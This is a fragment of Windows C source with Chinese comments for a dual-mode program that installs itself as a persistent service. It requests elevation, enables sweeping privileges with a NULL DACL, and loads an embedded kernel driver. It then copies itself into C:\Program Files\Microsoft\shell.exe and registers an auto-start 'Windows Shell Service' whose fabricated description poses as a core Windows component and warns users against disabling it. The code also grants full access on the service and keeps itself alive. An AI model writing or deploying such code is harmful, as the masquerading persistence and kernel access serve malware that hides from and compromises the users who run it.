    SERVICE_TABLE_ENTRYA table[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)SvcMain },
        { NULL, NULL }
    };
    if (StartServiceCtrlDispatcherA(table)) {
        // 这是服务模式，由 SCM 管理，SvcMain 会运行业务逻辑
        return 0;
    }

    // 如果 StartServiceCtrlDispatcher 返回失败，且错误是“不是服务”，则进入应用程序模式
    DWORD err = GetLastError();
    if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // ===== 应用程序模式：执行提权、复制、创建服务（仅在此处执行一次） =====
        SetConsoleOutputCP(65001);
        printf("========================================\n");
        printf("  main_dual_new — 应用程序模式\n");
        printf("  PID: %lu, 会话: %lu\n",
               GetCurrentProcessId(), WTSGetActiveConsoleSessionId());
        printf("========================================\n\n");

        printf("[Phase 1/5] 权限检测与提升...\n");
        if (!IsElevated()) {
            printf("  当前未以管理员运行，正在请求提权...\n");
            if (!RunAsAdmin()) {
                printf("[FAIL] 提权失败，程序退出\n");
                return 1;
            } else {
                printf("[OK] 提权请求已发送 (UAC/runas)，当前实例退出\n");
                printf("  新实例将以管理员权限运行并继续执行\n");
                return 0;
            }
        } else {
            printf("[OK] 已是管理员权限\n");
        }

        /* ============================================================
         * ★ 内核级权限提升 ★
         *
         * 在管理员权限的基础上，进一步获取:
         *   1. NULL DACL 安全描述符 — 绕过所有权限检查
         *   2. 13 项关键内核特权 (SeTcbPrivilege, SeDebugPrivilege,
         *      SeLoadDriverPrivilege 等)
         *   3. Token 中全部可用特权遍历启用
         *
         * 达到与 StarlightGUI 同等的用户态最高权限。
         * ============================================================ */
        printf("\n[Phase 2/5] 内核级权限提升\n");
        ElevateToKernelLevel();

        /* ★ 加载内核驱动 Sirius.sys（从嵌入资源释放） ★ */
        printf("[Phase 2.5/5] 提取并加载内核驱动\n");
        {
            WCHAR driverPath[MAX_PATH];
            if (ExtractEmbeddedDriver(driverPath)) {
                LoadKernelDriver(L"SiriusDrv", driverPath);
            } else {
                printf("[FAIL] 无法从资源释放驱动文件，跳过驱动加载\n");
            }
        }

        /* ★ 驱动加载状态检测 ★
         * 检查 Sirius.sys 是否已加载到内核。
         * 如需加载驱动，请调用:
         *   LoadKernelDriver(L"SiriusDrv", L"Assets\\Sirius.sys");
         */
        PrintDriverLoadSummary(L"SiriusDrv", L"Sirius");

        /* ============================================================
         * ★★★ 内核级权限代码放置区域 ★★★
         *
         * 此处已满足内核级执行的全部前置条件:
         *   - 管理员权限: ✓
         *   - NULL DACL 安全描述符: ✓ (绕过权限检查)
         *   - SeDebugPrivilege: ✓ (打开任意进程)
         *   - SeLoadDriverPrivilege: ✓ (加载/卸载驱动)
         *   - SeBackupPrivilege: ✓ (绕过文件读取权限)
         *   - SeRestorePrivilege: ✓ (绕过文件写入权限)
         *   - SeImpersonatePrivilege: ✓ (模拟用户)
         *   - SeTakeOwnershipPrivilege: ✓ (取得所有权)
         *   - SeSecurityPrivilege: ✓ (审计日志管理)
         *   - Sirius.sys 内核驱动: ✓ (已加载到 Ring 0)
         *   - 设备句柄: CreateFile("\\\\.\\Sirius") + DeviceIoControl
         *
         * ┌─── 在此区域编写内核级代码 ───┐
         * │                                 │
         * │  // 示例: 打开驱动设备          │
         * │  HANDLE hDev = CreateFileW(     │
         * │      L"\\\\.\\Sirius",          │
         * │      GENERIC_READ | GENERIC_WRITE,
         * │      0, NULL, OPEN_EXISTING, 0, NULL);
         * │                                 │
         * │  // 示例: 发送 IOCTL 给驱动    │
         * │  DeviceIoControl(hDev,          │
         * │      IOCTL_CODE,                │
         * │      &input, sizeof(input),     │
         * │      &output, sizeof(output),   │
         * │      &returned, NULL);          │
         * │                                 │
         * │  // 示例: 内核级内存读写        │
         * │  SI_MEMORY mem = { ... };       │
         * │  DeviceIoControl(hDev,          │
         * │      IOCTL_SIRIUS_QUERY_SYSTEM_INFO,
         * │      ...);                      │
         * │                                 │
         * │  // 示例: 加载更多内核驱动      │
         * │  LoadKernelDriver(             │
         * │      L"MyDrv", L"C:\\mydrv.sys");│
         * │                                 │
         * └─────────────────────────────────┘
         *
         * IOCTL 定义参考: SiriusIO.h
         * 错误码定义参考: SiriusError.h
         * ============================================================ */



        /*==========================内核级代码结束===========================*/

        printf("[Phase 3/5] 文件部署与服务注册\n");

        char targetPath[MAX_PATH] = "C:\\Program Files\\Microsoft\\shell.exe";
        printf("  目标路径: %s\n", targetPath);

        char dirPath[MAX_PATH];
        strcpy(dirPath, targetPath);
        char *lastSlash = strrchr(dirPath, '\\');
        if (lastSlash) {
            *lastSlash = '\0';
            printf("  正在创建目录: %s\n", dirPath);
            int result = SHCreateDirectoryExA(NULL, dirPath, NULL);
            if (result != ERROR_SUCCESS && result != ERROR_ALREADY_EXISTS) {
                printf("[FAIL] 创建目录失败，错误码: %d\n", result);
                return 1;
            }
            printf("  目录就绪\n");
        }

        printf("  源路径: %s\n", _pgmptr);
        printf("  目标路径: %s\n", targetPath);

        printf("  正在停止旧服务...\n");
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "open";
        sei.lpFile = "cmd.exe";
        sei.lpParameters = "/c sc stop shell ";
        sei.nShow = SW_HIDE;

        if (!ShellExecuteExA(&sei)) {
            printf("[WARN] 停止命令执行失败 (错误: %lu)\n", GetLastError());
        } else {
            printf("  停止命令已执行\n");
        }

        if (!WaitForServiceStop("shell", 10000)) {
            printf("[WARN] 等待服务停止失败或超时，继续尝试复制文件\n");
        }

        printf("  正在复制文件...\n");
        if (!CopyFileA(_pgmptr, targetPath, FALSE)) {
            printf("[FAIL] 复制失败，错误码: %lu\n", GetLastError());
            return 1;
        }
        printf("[OK] 文件复制成功 (%s)\n", targetPath);

        printf("  正在注册服务...\n");
        SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!hSCM) {
            printf("[FAIL] 打开 SCM 失败，错误码: %lu\n", GetLastError());
            return 1;
        }

        /* 删除旧服务（忽略错误） */
        SC_HANDLE hOld = OpenServiceA(hSCM, "shell", SERVICE_STOP | DELETE);
        if (hOld) {
            printf("  删除旧服务...\n");
            SERVICE_STATUS status;
            ControlService(hOld, SERVICE_CONTROL_STOP, &status);
            Sleep(1000);
            if (!DeleteService(hOld)) {
                printf("[WARN] 删除旧服务失败，错误码: %lu\n", GetLastError());
            } else {
                printf("  旧服务已删除\n");
            }
            CloseServiceHandle(hOld);
        }

        // 创建新服务（宽字符路径）
        WCHAR wTargetPath[MAX_PATH];
        if (MultiByteToWideChar(CP_ACP, 0, targetPath, -1, wTargetPath, MAX_PATH) == 0) {
            printf("[FAIL] 路径转换失败\n");
            CloseServiceHandle(hSCM);
            return 1;
        }
        printf("  创建新服务: %ls\n", wTargetPath);
        SC_HANDLE hNew = CreateServiceW(
            hSCM,
            L"shell",
            L"Windows Shell Service",
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            wTargetPath,
            NULL, NULL, NULL, NULL, NULL
        );
        if (!hNew) {
            printf("[FAIL] 创建服务失败，错误码: %lu\n", GetLastError());
            CloseServiceHandle(hSCM);
            return 1;
        } else {
            printf("[OK] 服务创建成功\n");

            /* 设置描述 */
            WCHAR desc[] = L"Windows Shell 服务 (shell):作为 Windows 用户交互体验的核心系统服务，负责托管桌面、任务栏、文件资源管理器及开始菜单等关键外壳组件。它通过 RPC 与 Winlogon 和 Session Manager 协同，动态管理窗口消息泵、图标缓存与上下文菜单扩展，确保图形界面的实时响应。该服务在系统启动早期以高优先级加载，并依赖 DWM 进行硬件加速渲染；若异常终止，系统将自动触发外壳故障恢复流程，尝试重新生成 Explorer.exe 进程而不影响已运行的后台应用程序。自 Windows 10 起，shell 服务还集成了对虚拟桌面、云剪贴板及任务视图的时间线索引支持，其状态可通过 services.msc 或 sc query shell 查看，但切勿手动禁用，否则将导致登录后无可用操作界面。";
            SERVICE_DESCRIPTIONW sd = { desc };
            if (!ChangeServiceConfig2W(hNew, SERVICE_CONFIG_DESCRIPTION, &sd)) {
                printf("[WARN] 设置描述失败，错误码: %lu\n", GetLastError());
            } else {
                printf("[OK] 服务描述已设置\n");
            }

            /* ★ 为服务设置完全访问安全描述符 ★ */
            PSECURITY_DESCRIPTOR pServiceSD = NULL;
            if (CreateFullAccessSDDL(&pServiceSD)) {
                if (SetServiceObjectSecurity(hNew, DACL_SECURITY_INFORMATION,
                                              pServiceSD)) {
                    printf("[OK] 服务安全描述符已设为完全访问\n");
                } else {
                    printf("[WARN] 服务安全描述符设置失败 (错误: %lu)\n",
                           GetLastError());
                }
                LocalFree(pServiceSD);
            }
        }

        // 启动服务
        printf("[Phase 4/5] 启动服务...\n");
        if (!StartService(hNew, 0, NULL)) {
            printf("[FAIL] 启动服务失败，错误码: %lu\n", GetLastError());
        } else {
            printf("[OK] 服务已启动\n");
        }

        CloseServiceHandle(hNew);
        CloseServiceHandle(hSCM);

        printf("[Phase 5/5] 进入保活主循环\n");
        printf("========================================\n\n");

        // 最后，进入“应用程序模式”主循环（无限保活）
        AppEntry();
        return 0;
    }

    // 其他错误
    printf("[ERROR] StartServiceCtrlDispatcher 失败 (错误码: %lu)\n", err);
    return 1;
}